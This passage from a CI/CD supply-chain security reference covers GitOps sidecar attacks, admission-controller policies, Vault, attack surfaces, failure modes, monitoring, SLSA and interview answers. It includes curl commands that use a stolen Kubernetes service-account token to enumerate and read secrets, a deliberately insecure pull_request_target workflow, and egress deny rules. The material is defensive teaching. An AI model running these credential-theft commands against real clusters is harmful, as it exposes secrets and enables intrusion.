ARGOCD AUTO-SYNCS THE CHANGE:
  ArgoCD reconciliation loop picks up the manifest diff
  Applies it to Kubernetes
  
  Without admission controllers:
  - New pods deploy with the malicious sidecar
  - The sidecar exfiltrates all environment variables (including secrets) every 60s
  - The hostPath mount gives full read/write access to the node's filesystem

WHY THIS SUCCEEDS IN DEFAULT CONFIGS:
  1. No required image signing verification in the cluster
  2. No admission controller rejecting the alpine:latest image or hostPath volumes
  3. ArgoCD has deploy permissions broad enough to add sidecars
  4. No secret access auditing detects the sidecar reading env vars
```

---

## 6. Security Controls & Defensive Mechanics

### 6.1 Signed Commits and Branch Protection

```
GPG COMMIT SIGNING MECHANICS:

Developer signs a commit:
  git commit -m "Fix payment bug"
  # Git invokes GPG: gpg --sign --armor -u <key_id>
  # Signs the commit object's canonical form
  # Signature stored in commit metadata
  
  Commit object:
  tree abc123...
  parent def456...
  author Jane Dev <jane@corp.com>
  ...
  gpgsig -----BEGIN PGP SIGNATURE-----
   iQEzBAABCAAdFiEEV8p...
   -----END PGP SIGNATURE-----

  Fix payment bug

GitHub branch protection rules:
  - Require signed commits: yes
  - Require pull request reviews: 2 approvals
  - Dismiss stale reviews on new push: yes
  - Require review from code owners: yes (CODEOWNERS file)
  - Require status checks to pass: yes (CI must pass)
  - Restrict who can push to matching branches: yes (CODEOWNERS list)
  - Require linear history: yes (no merge commits — forces rebasing)

CODEOWNERS file:
  # Anything in the .github/ directory requires security team approval
  .github/        @org/security-team
  # Payment code requires payment team + security team
  src/payment/    @org/payment-team @org/security-team
  # Kubernetes manifests require platform team
  k8s/            @org/platform-team
```

### 6.2 Admission Controllers for Runtime Enforcement

```
OPA/GATEKEEPER CONSTRAINT (prevents privileged containers):

apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sPSPPrivilegedContainer
metadata:
  name: no-privileged-containers
spec:
  match:
    kinds:
    - apiGroups: ["*"]
      kinds: ["Pod"]
    excludedNamespaces: ["kube-system"]  # System pods may need privileges
  
---
# The Rego policy behind this constraint:
package k8spspprivilegedcontainer

violation[{"msg": msg}] {
    container := input.review.object.spec.containers[_]
    container.securityContext.privileged == true
    msg := sprintf("Container %v cannot run as privileged", [container.name])
}

# This runs BEFORE any pod is admitted to the cluster
# ArgoCD applies a manifest → API Server → Admission Webhook → OPA/Gatekeeper
# If OPA returns a violation: the pod is REJECTED, Kubernetes returns 403
# The deployment never happens
```

**Additional admission controller policies:**

```yaml
# Require non-root user
violation[{"msg": msg}] {
    container := input.review.object.spec.containers[_]
    not container.securityContext.runAsNonRoot
    msg := sprintf("Container %v must set runAsNonRoot: true", [container.name])
}

# Require read-only root filesystem
violation[{"msg": msg}] {
    container := input.review.object.spec.containers[_]
    not container.securityContext.readOnlyRootFilesystem
    msg := "Container must have readOnlyRootFilesystem: true"
}

# Block hostPath volumes
violation[{"msg": msg}] {
    volume := input.review.object.spec.volumes[_]
    volume.hostPath
    msg := sprintf("hostPath volume %v is not allowed", [volume.name])
}

# Require image digest (not just tag)
violation[{"msg": msg}] {
    container := input.review.object.spec.containers[_]
    not contains(container.image, "@sha256:")
    msg := sprintf("Container %v must use image digest, not tag", [container.name])
}

# Require signed images (Cosign policy)
# This integrates with the Policy Controller webhook (Sigstore)
violation[{"msg": msg}] {
    container := input.review.object.spec.containers[_]
    not verified_image(container.image)
    msg := sprintf("Container %v image is not verified", [container.name])
}
```

### 6.3 Secret Management with Vault

```
VAULT SECRET INJECTION FLOW (Vault Agent Injector):

1. Developer declares a secret request in pod annotations:
   annotations:
     vault.hashicorp.com/agent-inject: "true"
     vault.hashicorp.com/agent-inject-secret-db-creds: "secret/data/payment/db"
     vault.hashicorp.com/role: "payment-service"

2. Vault Agent Injector (mutating admission webhook):
   - Intercepts all pod CREATE/UPDATE requests
   - Checks for vault.hashicorp.com/ annotations
   - Mutates the pod spec: adds an init container (vault-agent-init)
     and a sidecar container (vault-agent) to the pod

3. vault-agent-init container runs first:
   a. Gets its Kubernetes Service Account Token from /var/run/secrets/kubernetes.io/serviceaccount/token
   b. POSTs to Vault: /v1/auth/kubernetes/login
      {
        "role": "payment-service",
        "jwt": "<service-account-token>"
      }
   c. Vault validates:
      - The JWT is a valid Kubernetes SA token for this cluster
      - The SA name and namespace match the Vault role's policy
      - Returns a Vault token with TTL (e.g., 1h)
   d. Uses Vault token to read: GET /v1/secret/data/payment/db
   e. Writes the secret to a shared memory volume (/vault/secrets/)
      tmpfs (RAM-only, not persisted to disk)
   
4. Main application container starts, reads from /vault/secrets/db-creds

5. vault-agent sidecar renews the Vault token and refreshes secrets periodically

VAULT POLICY MECHANICS:
  path "secret/data/payment/*" {
    capabilities = ["read"]
  }
  
  Vault Kubernetes Auth Role:
  {
    "bound_service_account_names": ["payment-service"],
    "bound_service_account_namespaces": ["production"],
    "policies": ["payment-service-policy"],
    "ttl": "1h"
  }
  
  This means: ONLY the ServiceAccount "payment-service" 
              in ONLY the "production" namespace
              can read secrets under "secret/data/payment/"
```

---

## 7. Attack Surface Mapping

### 7.1 All Entry Points

```
EXTERNAL ATTACK SURFACE:
  ┌────────────────────────────────────────────────────────────────┐
  │  Source Code Repository (GitHub/GitLab)                        │
  │  - Pull request submissions (open to external contributors)    │
  │  - Webhook endpoints (GitHub → CI, must validate HMAC sigs)   │
  │  - API: token theft → arbitrary repo/org access               │
  │  - Actions: poisoning shared workflow files in public repos    │
  │  TRUST: LOW for PR authors, HIGH for merged code              │
  └────────────────────────────────────────────────────────────────┘

  ┌────────────────────────────────────────────────────────────────┐
  │  Public Package Registries (npm, PyPI, RubyGems, etc.)         │
  │  - Dependency confusion attacks                                │
  │  - Typosquatting                                               │
  │  - Account takeover → legitimate package poisoning             │
  │  - Install scripts (postinstall hooks) → arbitrary execution   │
  │  TRUST: NONE — all packages must be verified                  │
  └────────────────────────────────────────────────────────────────┘

  ┌────────────────────────────────────────────────────────────────┐
  │  Public Container Registries (Docker Hub, GHCR)                │
  │  - Tag mutation (upstream changes what a tag points to)        │
  │  - Base image poisoning                                        │
  │  - Malicious images that pass SAST/vulnerability scanning      │
  │  TRUST: NONE — must verify by digest + signature              │
  └────────────────────────────────────────────────────────────────┘

INTERNAL ATTACK SURFACE:
  ┌────────────────────────────────────────────────────────────────┐
  │  CI Runner Environment                                          │
  │  - Has access to build secrets, OIDC tokens                    │
  │  - Can run arbitrary code (malicious dependencies)             │
  │  - Shared kernel on self-hosted runners                        │
  │  - Network egress to package registries, metadata service      │
  │  TRUST: MEDIUM — ephemeral, but has elevated privileges       │
  └────────────────────────────────────────────────────────────────┘

  ┌────────────────────────────────────────────────────────────────┐
  │  Container Registry (ECR/Harbor/internal)                       │
  │  - If compromised: malicious images deployed to production     │
  │  - Cross-account access via misconfigured bucket policies      │
  │  TRUST: HIGH (must be, artifacts are deployed from here)      │
  └────────────────────────────────────────────────────────────────┘

  ┌────────────────────────────────────────────────────────────────┐
  │  GitOps Config Repository                                       │
  │  - Direct path to production deployment                        │
  │  - Must be write-protected; changes require approval           │
  │  - CI bot's write token is a high-value target                 │
  │  TRUST: HIGH (approved changes), LOW (CI bot credentials)     │
  └────────────────────────────────────────────────────────────────┘

  ┌────────────────────────────────────────────────────────────────┐
  │  ArgoCD / Flux (CD Controller)                                  │
  │  - Has deploy permissions for production namespaces             │
  │  - If its service account is stolen: arbitrary K8s deployment  │
  │  - UI accessible? (ArgoCD has web UI, often misconfigured)      │
  │  TRUST: HIGH (must be careful with its K8s RBAC scope)        │
  └────────────────────────────────────────────────────────────────┘

  ┌────────────────────────────────────────────────────────────────┐
  │  Kubernetes API Server                                          │
  │  - The control plane for all workloads                         │
  │  - Unauthorized access = complete cluster compromise           │
  │  - Service account tokens from pods are a common attack path   │
  │  TRUST: HIGH (strict RBAC, audit logging mandatory)           │
  └────────────────────────────────────────────────────────────────┘
```

### 7.2 Attack Surface Map ASCII Diagram

```
══════════════════════════════════════════════════════════════════════════
INTERNET (Zero Trust)
  ┌───────────────────────────────────────────────────────────────────┐
  │ Attacker / External Contributor                                   │
  │  ├── Opens PRs with malicious code / workflow injections          │
  │  ├── Publishes typosquatted npm/PyPI packages                     │
  │  ├── Compromises upstream base image accounts                     │
  │  └── Phishes developer credentials (GitHub token theft)          │
  └───────────────────────────────────────────────────────────────────┘
       │                              │
       │ PRs / Webhooks               │ npm install / FROM image
       ▼                              ▼
TRUST BOUNDARY 1: Code Review + Signed Commits + Webhook HMAC Validation
       │                              │
══════════════════════════════════════════════════════════════════════════
SOURCE CONTROL ZONE
  ┌─────────────────────────────────────────────────────────────────┐
  │  GitHub/GitLab                    Public Registries              │
  │  - Source code repo               - npm registry                 │
  │  - Config repo (GitOps)           - Docker Hub                   │
  │  - CI workflow files              - PyPI                         │
  └──────────────────┬──────────────────────────────────────────────┘
                     │ CI trigger (OIDC auth)
TRUST BOUNDARY 2: OIDC Token Validation + Secret Scoping
                     │
══════════════════════════════════════════════════════════════════════════
CI EXECUTION ZONE
  ┌─────────────────────────────────────────────────────────────────┐
  │  CI Runner (ephemeral VM/container)                              │
  │  - Runs arbitrary code (dependency install scripts)              │
  │  - Accesses build secrets (OIDC-scoped temp creds)              │
  │  - Network: can reach internet (package download)               │
  │             can reach metadata service (SSRF risk)              │
  │  - Produces artifacts: images, binaries, attestations            │
  └──────────────────┬──────────────────────────────────────────────┘
                     │ Push signed + attested image
TRUST BOUNDARY 3: Image Signing (Cosign) + SLSA Provenance Attestation
                     │
══════════════════════════════════════════════════════════════════════════
ARTIFACT ZONE
  ┌─────────────────────────────────────────────────────────────────┐
  │  Container Registry (ECR/Harbor)                                 │
  │  - Stores signed container images                                │
  │  - Only CI can push; ArgoCD/K8s can pull                        │
  │  - Image signatures stored alongside manifests                  │
  └──────────────────┬──────────────────────────────────────────────┘
                     │ ArgoCD reconciles (OIDC auth to K8s)
TRUST BOUNDARY 4: ArgoCD Auth + Image Signature Verification at Admission
                     │
══════════════════════════════════════════════════════════════════════════
PRODUCTION ZONE
  ┌─────────────────────────────────────────────────────────────────┐
  │  Kubernetes Cluster                                              │
  │  ├── API Server (RBAC + Audit logging)                          │
  │  ├── etcd (encrypted at rest)                                   │
  │  ├── OPA/Gatekeeper (admission control)                         │
  │  ├── CNI (NetworkPolicy enforcement)                            │
  │  ├── SPIRE (workload identity)                                  │
  │  └── Vault (secret injection)                                   │
  └─────────────────────────────────────────────────────────────────┘

══════════════════════════════════════════════════════════════════════════
```

---

## 8. Failure Modes & Edge Cases

### 8.1 Split-Brain in GitOps

```
SCENARIO: ArgoCD loses connectivity to the config repository.

State divergence:
  Config repo: deployment A should run image v2.0 (just committed by CI)
  Kubernetes: deployment A is running image v1.9 (last synced state)
  ArgoCD: cannot pull config repo → stuck in "Unknown" sync state

BEHAVIORS:
  - ArgoCD will NOT auto-sync (can't read the desired state)
  - It also will NOT roll back (last known state is v1.9 in K8s)
  - A manual `kubectl apply` from an operator could bypass ArgoCD entirely
  - If ArgoCD reconnects: it will try to sync to the current config repo HEAD
  
CASCADE RISK:
  If the config repo git server has a brief outage during a major incident:
  - Incident response team cannot deploy a hotfix via normal GitOps
  - They fall back to direct kubectl (bypassing all GitOps controls)
  - Emergency changes are made directly, skipping code review and signing
  - The GitOps config repo is now out of sync with reality
  - When ArgoCD reconnects, it will try to REVERT the emergency changes
    (because config repo doesn't have them)
  
MITIGATION:
  - ArgoCD sync windows: define maintenance windows where auto-sync is disabled
  - "Break glass" procedures with audit trails for direct kubectl access
  - Git mirrors with high availability (multi-region git servers)
  - ArgoCD "sync policy: prune: false" so it doesn't remove resources
    that aren't in the config repo (safer but means orphaned resources)
```

### 8.2 Cascading Failures from Admission Controller Misconfiguration

```
SCENARIO: OPA/Gatekeeper admission webhook has a bug or is unavailable.

DEFAULT BEHAVIOR (fail-open):
  If the admission webhook cannot be reached:
  WebhookConfiguration.failurePolicy = Ignore
  → Kubernetes admits the pod anyway (ignoring the policy check)
  → Security control is silently bypassed
  → Privileged containers, unscanned images, etc. all get through
  
DEFAULT BEHAVIOR (fail-closed):
  WebhookConfiguration.failurePolicy = Fail
  → Kubernetes rejects ALL pod creation if webhook is unavailable
  → A Gatekeeper outage brings down your entire cluster (no new pods)
  → This includes your Gatekeeper pods themselves trying to restart
  → Deadlock: Gatekeeper can't restart because Gatekeeper is down
  
THE CORRECT APPROACH:
  failurePolicy: Fail     ← For security: we don't want bypass
  namespaceSelector:
    matchExpressions:
    - key: admission.gatekeeper.sh/ignore
      operator: DoesNotExist   ← Only apply to namespaces WITHOUT this label
  
  And mark system namespaces (kube-system, gatekeeper-system) with the ignore label
  so Gatekeeper itself can restart even if there's an admission policy issue

ANOTHER FAILURE MODE: Policy too restrictive
  New engineer deploys a policy:
  "All images must come from registry.io/internal/"
  
  CI was pulling base images from docker.io/library/ for 3 years.
  Policy deployed to production at 2pm.
  At 3pm, a Kubernetes node fails. The replacement node tries to pull
  docker.io/library/nginx:alpine for a system component.
  Admission controller rejects it.
  The node replacement fails. The cluster degrades.
  
  MITIGATION:
  - Test policies in audit mode first (Gatekeeper: dryRun mode)
  - Staged rollout: apply to non-production namespaces first
  - Monitor for policy violations before switching from audit to enforce
```

### 8.3 Token Amplification in Service Account Compromise

```
SCENARIO: A production pod's service account token is stolen.

How the token is stolen:
  - Application vulnerability (LFI: read /var/run/secrets/kubernetes.io/serviceaccount/token)
  - SSRF: attacker causes the application to read local files
  - Container escape: attacker gains access to pod filesystem

What the attacker can do with a standard service account token:
  Base64-decode the JWT, examine the claims:
  {
    "iss": "kubernetes/serviceaccount",
    "kubernetes.io/serviceaccount/namespace": "production",
    "kubernetes.io/serviceaccount/service-account.name": "payment-service",
    "kubernetes.io/serviceaccount/service-account.uid": "abc-123",
    "sub": "system:serviceaccount:production:payment-service"
  }
  
  Use token to query K8s API:
  curl -H "Authorization: Bearer $TOKEN" \
    https://kubernetes.default.svc/api/v1/namespaces/production/secrets/
  
  If RBAC is misconfigured (common): the token can list/read all secrets in namespace
  Result: attacker reads every secret in production namespace

AMPLIFICATION PATH:
  1. Steal service account token from payment-service (targeted vulnerability)
  2. Token has permission to read secrets in production namespace
  3. Read DB password secret → direct database access
  4. Read redis password → cache access
  5. Read stripe-api-key secret → payment fraud
  
  One compromised pod → full namespace secret exposure

PROPER RBAC SCOPING:
  payment-service should ONLY be able to read its OWN secrets:
  resources: ["secrets"]
  resourceNames: ["payment-db-creds"]   ← Specific named resource only
  verbs: ["get"]                         ← No list, no watch, no update
  
  With this restriction: stolen token can ONLY read payment-db-creds
  All other secrets are inaccessible
```

---

## 9. Mitigations & Observability

### 9.1 Concrete Fixes by Attack Category

**Supply chain dependency attacks:**
```
1. LOCK FILES WITH INTEGRITY HASHES (npm, pip, poetry):
   package-lock.json: each package has "integrity": "sha512-<hash>"
   pip freeze > requirements.txt + pip-audit for vulnerability scanning
   
   npm config:
   # .npmrc
   registry=https://registry.internal.corp.com/  # Private registry
   @corp:registry=https://registry.internal.corp.com/  # Scoped packages
   strict-ssl=true
   
2. VENDORING (most secure):
   All dependencies committed to repo
   No network access during build (air-gapped build environment)
   Trade-off: large repos, manual update process

3. PRIVATE REGISTRY WITH ALLOWLIST:
   Only pre-approved packages available
   Every new package requires security review before addition
   
4. DEPENDENCY REVIEW ACTION (GitHub):
   - name: Dependency Review
     uses: actions/dependency-review-action@v3
     with:
       fail-on-severity: moderate
       deny-licenses: GPL-3.0, AGPL-3.0
       # Blocks PRs that add vulnerable or license-incompatible deps

5. BLOCK POSTINSTALL SCRIPTS:
   npm install --ignore-scripts
   # Prevents arbitrary code execution during dependency install
   # Trade-off: some packages legitimately need install scripts (node-gyp)
```

**Image supply chain:**
```yaml
# Dockerfile best practices
FROM node:20-alpine@sha256:9a539be...  # ALWAYS pin by digest

# Cosign policy in Kubernetes (Sigstore Policy Controller)
apiVersion: policy.sigstore.dev/v1beta1
kind: ClusterImagePolicy
metadata:
  name: require-signed-images
spec:
  images:
  - glob: "registry.io/**"
  authorities:
  - keyless:
      url: https://fulcio.sigstore.dev
      identities:
      - issuer: https://token.actions.githubusercontent.com
        subjectRegExp: "https://github.com/myorg/.*/.github/workflows/.*"
  # Only allows images signed by GitHub Actions from myorg
```

**Secrets management:**
```yaml
# NEVER do this:
env:
- name: DB_PASSWORD
  value: "hardcoded-password"   # Committed to git
  
# NEVER do this:
env:
- name: DB_PASSWORD
  valueFrom:
    secretKeyRef:
      name: db-secret           # K8s secret = base64 in etcd, not encrypted at rest
      key: password             # by default. Use envelope encryption.

# DO this: External Secrets Operator
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: payment-db-credentials
  namespace: production
spec:
  refreshInterval: "1h"
  secretStoreRef:
    name: vault-backend
    kind: ClusterSecretStore
  target:
    name: payment-db-creds     # Creates a K8s Secret with this name
    creationPolicy: Owner
  data:
  - secretKey: db-password
    remoteRef:
      key: secret/payment/db
      property: password
```

---

### 9.2 What to Monitor

**Kubernetes API Server Audit Logs (critical):**
```json
// Log entry for listing secrets (potential credential theft)
{
  "kind": "Event",
  "apiVersion": "audit.k8s.io/v1",
  "level": "Request",
  "auditID": "abc-123",
  "stage": "ResponseComplete",
  "requestURI": "/api/v1/namespaces/production/secrets",
  "verb": "list",
  "user": {
    "username": "system:serviceaccount:production:payment-service",
    "groups": ["system:serviceaccounts"]
  },
  "responseStatus": {"code": 200},
  "requestReceivedTimestamp": "2024-01-15T14:22:01Z"
}
// ALERT: service accounts listing ALL secrets (not specific ones)
//        should only GET specific named secrets
```

**Metrics to monitor:**
```
CI/CD Security Metrics:
  - ci_failed_signature_verifications_total (Cosign failures → possible tamper)
  - admission_controller_violations_total{policy="..."} (policy breaches)
  - vault_secret_reads_by_sa{namespace="..."} (secret access patterns)
  - k8s_api_list_secrets_by_sa (listing secrets = suspicious)
  - new_serviceaccount_token_requests_total (abnormal token minting)
  - image_pull_failures_total (digest mismatches → possible registry tampering)

Anomaly alerts (Prometheus + Alertmanager):
  - Service account token used from unexpected source IP
  - Significant spike in k8s API calls from a pod
  - New image digest first seen (unknown image deployed)
  - CI job duration anomaly (2x longer than baseline → possible exfiltration)
  - CI job making DNS queries to unknown external domains
```

**Network egress monitoring for CI:**
```yaml
# Calico GlobalNetworkPolicy: restrict CI runner egress
apiVersion: projectcalico.org/v3
kind: GlobalNetworkPolicy
metadata:
  name: ci-runner-egress
spec:
  selector: app == 'ci-runner'
  egress:
  # Allow only approved registries
  - action: Allow
    protocol: TCP
    destination:
      nets: ["<registry-ip>/32"]
      ports: [443]
  # Allow only approved package registries
  - action: Allow
    protocol: TCP
    destination:
      domains:
      - "registry.npmjs.org"
      - "pypi.org"
      - "registry.internal.corp.com"
      ports: [443]
  # Block metadata service explicitly
  - action: Deny
    destination:
      nets: ["169.254.169.254/32"]
  # Default deny all other egress
  - action: Deny
```

---

### 9.3 SLSA Framework for Supply Chain Integrity

SLSA (Supply Chain Levels for Software Artifacts) provides a framework for asserting provenance:

```
SLSA LEVELS:

SLSA 1: Documented build process
  - Build script exists
  - No integrity guarantees

SLSA 2: Tamper-evident provenance
  - Signed provenance document from CI
  - States: what code was built, by which CI, at what time
  - Hosted build process (not developer's laptop)

SLSA 3: Build service security guarantees
  - Source reviewed before build (PR + approval)
  - Build parameters cannot be modified by user
  - Isolated build environment (ephemeral runner)
  - Provenance signed with signing key inaccessible to user

SLSA 4: Hermetic, reproducible builds
  - All inputs fully declared (no network access during build)
  - Build is reproducible (bit-for-bit same output given same input)
  - Two-person review for all changes

GENERATING SLSA PROVENANCE (GitHub Actions):
  - uses: slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@v1.9.0
    with:
      image: registry.io/myapp
      digest: ${{ needs.build.outputs.digest }}
  
  This produces a signed provenance attestation:
  {
    "_type": "https://in-toto.io/Statement/v0.1",
    "predicateType": "https://slsa.dev/provenance/v0.2",
    "subject": [{"name": "registry.io/myapp", "digest": {"sha256": "abc123..."}}],
    "predicate": {
      "builder": {"id": "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/..."},
      "buildType": "https://github.com/slsa-framework/slsa-github-generator/...",
      "invocation": {
        "configSource": {
          "uri": "git+https://github.com/myorg/myrepo@refs/heads/main",
          "digest": {"sha1": "a3f2b9..."}  // Exact commit
        }
      }
    }
  }
  
  This attestation proves: this specific image was built from this exact commit
  by this specific GitHub Actions workflow. An attacker cannot create an 
  image with valid SLSA provenance without committing to the monitored repository.
```

---

## 10. Interview Questions

### Q1: Explain the difference between code signing (GPG commit signatures) and supply chain integrity (Sigstore/Cosign). Why does signing commits not prevent supply chain attacks?

**Answer:**

**Git commit signing** (GPG) proves that a specific person's private key was used to create a commit. It answers: "Did Jane Developer actually write this?" It authenticates the *author*. But it does NOT:
- Prove what the code will do when built
- Prove what external dependencies were used at build time
- Prove that the built artifact corresponds to the signed commit
- Protect against a legitimate committer (Jane herself) introducing malicious code

**Sigstore/Cosign image signing** proves that a specific build process produced a specific artifact. It authenticates the *build provenance*. When combined with SLSA attestations, it answers: "Was this container image built from commit `a3f2b9...` in repository `github.com/myorg/repo` by the authorized GitHub Actions workflow?"

**The gap in commit signing alone:**

Consider this attack: An attacker compromises the CI runner's environment (via a malicious dependency). The CI runner builds a malicious image. Jane's commits are all properly GPG-signed. The image in the registry contains malware, but the code it was "built from" appears to be Jane's signed commit.

Cosign + SLSA fills this gap by creating a signed attestation that cryptographically ties the output artifact (container image digest) to the input (commit hash + repository + CI workflow). If an attacker intercepts the build and produces a different image than what the code would produce, the Cosign signature would be invalid (because the signature is over the specific digest, which would differ).

**What if:** What if both the CI signing key AND the git repository are compromised? Then both the commit signature and the image signature can be forged. This is why defense-in-depth matters: admission controllers that require the signing key to match an identity tied to the specific GitHub Actions workflow (via OIDC claims in Cosign keyless signing) make this harder. The attacker would need to also compromise GitHub's OIDC token issuance.

---

### Q2: Why is `pull_request_target` in GitHub Actions particularly dangerous, and what's the exact mechanism that makes it different from `pull_request`?

**Answer:**

**`pull_request` trigger:** The workflow runs in the context of the **fork or branch** that the PR came from. It has:
- Read-only access to the base repository
- No access to repository secrets (sensitive secrets not exposed)
- Limited `GITHUB_TOKEN` with read-only permissions
- The code that runs is the PR author's code

**`pull_request_target` trigger:** The workflow runs in the context of the **base repository** (the target of the PR). It has:
- The base repository's secrets (write permissions)
- The `GITHUB_TOKEN` with write permissions to the base repo
- CRUCIALLY: The workflow file that runs is from the BASE branch, not the PR
- BUT: it still receives event data from the PR (title, body, changed files, etc.)

**The dangerous misconfiguration:**

```yaml
on: pull_request_target

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3  # By default, checks out the BASE branch
    - uses: actions/checkout@v3
      with:
        ref: ${{ github.event.pull_request.head.sha }}  # DANGEROUS: checks out PR code
    - run: |
        # Now runs PR author's code with BASE branch's write permissions
        npm install && npm test
        # The npm install can run postinstall scripts from the PR author
```

Even without checking out the PR code, the workflow receives PR metadata as inputs, and if those inputs are used without sanitization in shell scripts (as shown in Attack Scenario 2), code injection is possible.

**The correct pattern:** Use `pull_request` for untrusted code, and require a maintainer to explicitly approve running `pull_request_target` workflows on PRs from external forks (GitHub's "Require approval for all outside collaborators" setting).

---

### Q3: A Kubernetes pod's service account token is stolen via an application vulnerability. Walk through the exact steps an attacker takes and where you would detect it.

**Answer:**

**Step 1: Extract the token**
The token is at `/var/run/secrets/kubernetes.io/serviceaccount/token`. An attacker with an LFI (Local File Inclusion) or RCE vulnerability can read this. The token is a JWT — base64-decode the payload to see its claims.

**Step 2: Enumerate permissions**
```bash
curl -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc:443/api/v1/namespaces/production/
# Test what endpoints respond with 200 vs 403
```

**Step 3: List secrets (if RBAC allows)**
```bash
curl -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/production/secrets/
```

**Step 4: Lateral movement**
If the service account has list/get permissions on other namespaces or cluster-level resources, the attacker moves laterally.

**Detection points:**

1. **Kubernetes Audit Logs:** Every API call is logged. An unusually high volume of API calls from a service account that normally makes zero direct API calls is immediately suspicious. Alert: `"service account X made Y API calls in the last 5 minutes, baseline is 0."`

2. **IP source anomaly:** The stolen token is being used from the attacker's machine (outside the cluster) or from a different pod. The API server receives connections from the attacker's IP, not from within the pod's network. The Kubernetes audit log records the source IP — if `system:serviceaccount:production:payment-service` is calling the API from `185.220.101.47` (a Tor exit node), that's an immediate alert.

3. **Unusual API paths:** `list /secrets` from a service account that should only `get /secrets/payment-db-creds`. The audit log records the exact API path and verb.

4. **Vault audit log:** If secrets are in Vault, the stolen K8s SA token won't grant Vault access (it needs a Vault login with the token, which would be logged and might be geolocated to an unexpected IP).

5. **Network anomaly:** If the application pod suddenly makes connections to the Kubernetes API server (`10.96.0.1:443`) when it never historically did, that's an anomaly. The service mesh (Istio/Linkerd) or network policy logs capture this.

**Mitigation that stops this entirely:** Disable service account token automounting (`automountServiceAccountToken: false`) for pods that don't need it. Use projected service account tokens with audience binding so the token is only valid for specific services, not the Kubernetes API.

---

### Q4: Describe the OIDC token exchange mechanism between GitHub Actions and AWS in detail. What prevents an attacker from forging a GitHub Actions OIDC token?

**Answer:**

**Token issuance:** GitHub Actions generates OIDC tokens internally. When a workflow step requests an OIDC token, GitHub's token service creates a JWT and signs it with GitHub's private key (rotated regularly). The JWT contains:
- `iss` (issuer): `https://token.actions.githubusercontent.com`
- `sub` (subject): encodes the repo, branch, workflow, and environment
- `aud` (audience): the specific service this token is for
- `exp` (expiration): typically 10 minutes

**JWKS endpoint:** GitHub publishes its public key at `https://token.actions.githubusercontent.com/.well-known/jwks`. AWS, GCP, and Vault periodically fetch this JWKS (JSON Web Key Set) to get the current signing public keys.

**AWS STS validation:**
When AWS receives `AssumeRoleWithWebIdentity`:
1. Parses the JWT header to get the `kid` (key ID)
2. Fetches the JWKS from the `iss` URL (or uses cached copy)
3. Finds the public key with matching `kid`
4. Verifies the JWT signature using RSA or ECDSA: `verify(signature, payload, public_key)`
5. Checks `exp` is in the future
6. Checks `iss` matches the expected issuer
7. Evaluates the trust policy conditions against `sub`

**What prevents forgery:**
The signature verification in step 4 uses asymmetric cryptography. Forging the JWT requires the private key, which only GitHub holds. The private key never leaves GitHub's infrastructure. An attacker cannot produce a valid signature without it.

**What an attacker CAN do:**
- If GitHub's OIDC service is compromised (GitHub incident) → attacker can issue arbitrary tokens
- If the JWKS endpoint is compromised (DNS hijacking) → attacker can substitute a different public key, making their forged tokens validate against a key they control. AWS/GCP/Vault should use pinned JWKS or require TLS certificate validation (they do).
- If the AWS trust policy is too permissive (`sub` condition allows `*`), any GitHub Actions workflow from any repository can assume the role.

**What if:** What if the `sub` claim is set to only allow `repo:myorg/myrepo:ref:refs/heads/main`? An attacker who has compromised a different branch or fork cannot generate a token with this exact `sub` value. They would get a token with `sub: repo:myorg/myrepo:ref:refs/heads/attacker-branch`, which the trust policy would reject.

---

### Q5: Explain how an OPA/Gatekeeper admission controller works at the technical level. What happens if the webhook is down, and how do you design for both security and availability?

**Answer:**

**Mechanics:**

When a resource (Pod, Deployment, etc.) is submitted to the Kubernetes API server:

1. The API server processes authentication and authorization (RBAC)
2. The API server calls all registered **MutatingAdmissionWebhooks** (can modify the resource)
3. The API server calls all registered **ValidatingAdmissionWebhooks** (can reject the resource)
4. OPA/Gatekeeper registers as a validating webhook

**The webhook call:**
```
API Server → HTTPS POST to Gatekeeper (port 8443):
{
  "apiVersion": "admission.k8s.io/v1",
  "kind": "AdmissionReview",
  "request": {
    "uid": "705ab4f5-6393-11e8-b7cc-42010a800002",
    "kind": {"group": "apps", "version": "v1", "kind": "Deployment"},
    "operation": "CREATE",
    "object": { ... the full Deployment spec ... }
  }
}
```

Gatekeeper evaluates all applicable Rego policies against `input.review.object`. Returns:
```json
{
  "response": {
    "uid": "705ab4f5...",
    "allowed": false,
    "status": {
      "code": 403,
      "message": "Container nginx cannot run as privileged [no-privileged]"
    }
  }
}
```

**The availability problem:**

`failurePolicy: Fail` means: if Gatekeeper is unreachable (pod restarting, OOM, network issue), ALL resource creation in the cluster fails. This is extremely dangerous for a production cluster.

`failurePolicy: Ignore` means: if Gatekeeper is unreachable, all resources are admitted without policy checking. Security is silently bypassed.

**The correct design:**

```yaml
# Gatekeeper ValidatingWebhookConfiguration
webhooks:
- name: validation.gatekeeper.sh
  failurePolicy: Fail          # Security first
  # BUT: exclude system namespaces so they can self-recover
  namespaceSelector:
    matchExpressions:
    - key: admission.gatekeeper.sh/ignore
      operator: DoesNotExist
  # Gatekeeper itself runs in gatekeeper-system, which has the ignore label
  
  # Ensure webhook is highly available:
  # - Gatekeeper runs with 3 replicas
  # - Pod Disruption Budget: minAvailable: 2
  # - Resources: sufficient CPU/memory to handle load spikes
  # - PriorityClass: system-cluster-critical
  # - topologySpreadConstraints: spread across availability zones
```

**The Gatekeeper self-heal problem:** Gatekeeper pods restart with Kubernetes creating new pods → but if Gatekeeper is the one evaluating pod creation → deadlock?

Solution: Gatekeeper's own namespace (`gatekeeper-system`) has the `admission.gatekeeper.sh/ignore` label, excluding it from policy evaluation. Gatekeeper pods can always restart regardless of policy state. This means Gatekeeper itself is an exclusion from its own policies — which is an accepted tradeoff.

---

*End of document. This breakdown represents a production-grade CI/CD security reference at the level expected of a senior security engineer, DevSecOps architect, or staff engineer.*